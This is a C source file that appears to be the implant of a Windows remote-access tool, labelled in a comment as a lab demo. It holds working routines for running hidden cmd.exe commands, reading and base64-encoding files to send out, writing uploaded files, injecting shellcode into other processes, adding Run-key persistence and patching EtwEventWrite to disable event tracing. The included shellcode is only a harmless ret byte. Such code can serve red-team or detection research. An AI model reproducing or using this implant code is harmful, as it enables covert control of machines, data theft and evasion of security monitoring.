#include "common.h"

int run_shell(const char *cmd, char *out, size_t out_sz, int *exit_code) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE rd = NULL, wr = NULL;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return -1;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(wr);
    if (!ok) {
        CloseHandle(rd);
        return -1;
    }

    size_t total = 0;
    char buf[512];
    DWORD n = 0;
    while (ReadFile(rd, buf, sizeof(buf) - 1, &n, NULL) && n > 0) {
        if (total + n >= out_sz - 1) break;
        memcpy(out + total, buf, n);
        total += n;
    }
    out[total] = '\0';
    CloseHandle(rd);
    WaitForSingleObject(pi.hProcess, 30000);
    DWORD rc = 0;
    GetExitCodeProcess(pi.hProcess, &rc);
    if (exit_code) *exit_code = (int)rc;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

int file_download(const char *path, char *b64_out, size_t b64_sz) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return -1;
    DWORD sz = GetFileSize(hf, NULL);
    if (sz == INVALID_FILE_SIZE || sz > MAX_HTTP_RESP / 2) {
        CloseHandle(hf);
        return -1;
    }
    unsigned char *raw = (unsigned char *)malloc(sz + 1);
    if (!raw) {
        CloseHandle(hf);
        return -1;
    }
    DWORD read = 0;
    if (!ReadFile(hf, raw, sz, &read, NULL)) {
        free(raw);
        CloseHandle(hf);
        return -1;
    }
    CloseHandle(hf);
    int rc = base64_encode(raw, read, b64_out, b64_sz);
    free(raw);
    return rc < 0 ? -1 : 0;
}

int file_upload(const char *path, const char *b64_data) {
    size_t max_dec = strlen(b64_data);
    unsigned char *raw = (unsigned char *)malloc(max_dec);
    if (!raw) return -1;
    size_t written = 0;
    if (base64_decode(b64_data, raw, max_dec, &written) != 0) {
        free(raw);
        return -1;
    }
    HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        free(raw);
        return -1;
    }
    DWORD wr = 0;
    BOOL ok = WriteFile(hf, raw, (DWORD)written, &wr, NULL);
    CloseHandle(hf);
    free(raw);
    return ok ? 0 : -1;
}

int inject_pid(DWORD pid, const unsigned char *shellcode, size_t sc_len) {
    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hp) return -1;
    void *mem = VirtualAllocEx(hp, NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        CloseHandle(hp);
        return -1;
    }
    if (!WriteProcessMemory(hp, mem, shellcode, sc_len, NULL)) {
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE);
        CloseHandle(hp);
        return -1;
    }
    HANDLE ht = CreateRemoteThread(hp, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!ht) {
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE);
        CloseHandle(hp);
        return -1;
    }
    WaitForSingleObject(ht, 5000);
    CloseHandle(ht);
    CloseHandle(hp);
    return 0;
}

int persist_runkey(const char *name, const char *exe_path) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
        return -1;
    LONG rc = RegSetValueExA(hk, name, 0, REG_SZ, (const BYTE *)exe_path, (DWORD)strlen(exe_path) + 1);
    RegCloseKey(hk);
    return rc == ERROR_SUCCESS ? 0 : -1;
}

void evasion_apply(void) {
    /* v0.5 lab demo: patch EtwEventWrite → ret (document detection twin) */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    void *p = (void *)GetProcAddress(ntdll, "EtwEventWrite");
    if (!p) return;
    DWORD old = 0;
    if (VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old)) {
        *(unsigned char *)p = 0xC3; /* ret */
        VirtualProtect(p, 1, old, &old);
    }
}

/* Lab shellcode: returns immediately (used to verify inject path) */
static const unsigned char lab_sc[] = {0xC3};

int inject_self_test(void) {
    return inject_pid(GetCurrentProcessId(), lab_sc, sizeof(lab_sc));
}